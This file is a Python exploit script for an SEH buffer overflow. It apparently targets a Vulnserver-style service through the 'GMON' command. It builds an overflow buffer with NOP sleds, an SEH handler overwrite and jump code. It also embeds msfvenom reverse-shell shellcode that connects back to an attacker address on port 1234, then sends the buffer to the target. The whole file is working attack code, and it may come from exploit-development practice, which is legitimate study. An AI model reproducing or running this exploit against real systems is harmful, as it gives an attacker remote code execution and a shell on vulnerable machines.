#!/usr/bin/env python

import sys
import socket


host = '192.168.1.10'
port = 9999

try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except:

	print('socket failed')
	sys.exit(1)

entry_point='\x90\x90\x06\xeb' #jmp 6 bytes + 2 bytes of NOPs
seh_handler = '\xb4\x10\x50\x62' #little endian for 625010B4
jmp = '\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\xfe\xcd\xfe\xcd\xff\xe1'

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f c -b '\x00'
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
reverse_shell = (
"\xd9\xc2\xd9\x74\x24\xf4\x5f\x29\xc9\xb8\xf5\xf5\x7a\xda\xb1"
"\x52\x83\xc7\x04\x31\x47\x13\x03\xb2\xe6\x98\x2f\xc0\xe1\xdf"
"\xd0\x38\xf2\xbf\x59\xdd\xc3\xff\x3e\x96\x74\x30\x34\xfa\x78"
"\xbb\x18\xee\x0b\xc9\xb4\x01\xbb\x64\xe3\x2c\x3c\xd4\xd7\x2f"
"\xbe\x27\x04\x8f\xff\xe7\x59\xce\x38\x15\x93\x82\x91\x51\x06"
"\x32\x95\x2c\x9b\xb9\xe5\xa1\x9b\x5e\xbd\xc0\x8a\xf1\xb5\x9a"
"\x0c\xf0\x1a\x97\x04\xea\x7f\x92\xdf\x81\xb4\x68\xde\x43\x85"
"\x91\x4d\xaa\x29\x60\x8f\xeb\x8e\x9b\xfa\x05\xed\x26\xfd\xd2"
"\x8f\xfc\x88\xc0\x28\x76\x2a\x2c\xc8\x5b\xad\xa7\xc6\x10\xb9"
"\xef\xca\xa7\x6e\x84\xf7\x2c\x91\x4a\x7e\x76\xb6\x4e\xda\x2c"
"\xd7\xd7\x86\x83\xe8\x07\x69\x7b\x4d\x4c\x84\x68\xfc\x0f\xc1"
"\x5d\xcd\xaf\x11\xca\x46\xdc\x23\x55\xfd\x4a\x08\x1e\xdb\x8d"
"\x6f\x35\x9b\x01\x8e\xb6\xdc\x08\x55\xe2\x8c\x22\x7c\x8b\x46"
"\xb2\x81\x5e\xc8\xe2\x2d\x31\xa9\x52\x8e\xe1\x41\xb8\x01\xdd"
"\x72\xc3\xcb\x76\x18\x3e\x9c\xb8\x75\x41\x57\x51\x84\x41\x63"
"\x73\x01\xa7\x01\x63\x44\x70\xbe\x1a\xcd\x0a\x5f\xe2\xdb\x77"
"\x5f\x68\xe8\x88\x2e\x99\x85\x9a\xc7\x69\xd0\xc0\x4e\x75\xce"
"\x6c\x0c\xe4\x95\x6c\x5b\x15\x02\x3b\x0c\xeb\x5b\xa9\xa0\x52"
"\xf2\xcf\x38\x02\x3d\x4b\xe7\xf7\xc0\x52\x6a\x43\xe7\x44\xb2"
"\x4c\xa3\x30\x6a\x1b\x7d\xee\xcc\xf5\xcf\x58\x87\xaa\x99\x0c"
"\x5e\x81\x19\x4a\x5f\xcc\xef\xb2\xee\xb9\xa9\xcd\xdf\x2d\x3e"
"\xb6\x3d\xce\xc1\x6d\x86\xfe\x8b\x2f\xaf\x96\x55\xba\xed\xfa"
"\x65\x11\x31\x03\xe6\x93\xca\xf0\xf6\xd6\xcf\xbd\xb0\x0b\xa2")


buff = '\x41' * 2915 + '\x90' * 155 + reverse_shell + '\x90' * 29 + jmp + '\x41' * 55 + entry_point + seh_handler +'\x43' * (5100-3515-4-4)

command = 'GMON /.:/' + buff

s.connect((host, port))
print s.recv(1024)
s.send(command)
print s.recv(1024)
s.close()
